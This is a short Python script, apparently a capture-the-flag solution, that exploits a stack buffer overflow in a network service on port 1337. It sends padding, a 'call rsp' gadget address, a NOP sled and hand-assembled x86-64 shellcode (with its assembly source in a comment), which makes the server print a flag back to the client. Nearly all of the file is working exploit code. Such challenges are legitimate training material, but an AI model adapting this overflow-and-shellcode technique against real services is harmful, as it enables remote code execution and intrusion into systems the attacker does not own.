#!/usr/bin/python3

import socket
import struct
import sys

if len(sys.argv) < 2:
    print("Usage: ./solution.py <ip-address>")
    sys.exit(0)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((sys.argv[1], 1337))

client.recv(100)

padding = b'A' * 72
callRspGadgetAddress = struct.pack('<Q', 0x4116fa)  # FF D4    call rsp
nops = b'\x90' * 20

"""
bits 64

CLIENT_PRINTF equ 0x401e90
FLAG_ADDR equ 0x49a01d

    mov rbx, [rsp - 0x60]  ; callback_argument_t *argument
    mov rdi, [rbx + 8]     ; argument->client
    mov rsi, FLAG_ADDR
    xor rax, rax
    mov rbx, CLIENT_PRINTF
    call rbx
    hlt
"""
shellcode = b'\x48\x8b\x5c\x24\xa0\x48\x8b\x7b\x08\xbe\x1d\xa0\x49\x00\x48\x31\xc0\xbb\x90\x1e\x40\x00\xff\xd3\xf4'

payload = padding + callRspGadgetAddress + nops + shellcode

client.sendall(payload)

client.recv(100)
client.sendall(b'passwd')
client.recv(100)

print(client.recv(100).decode())
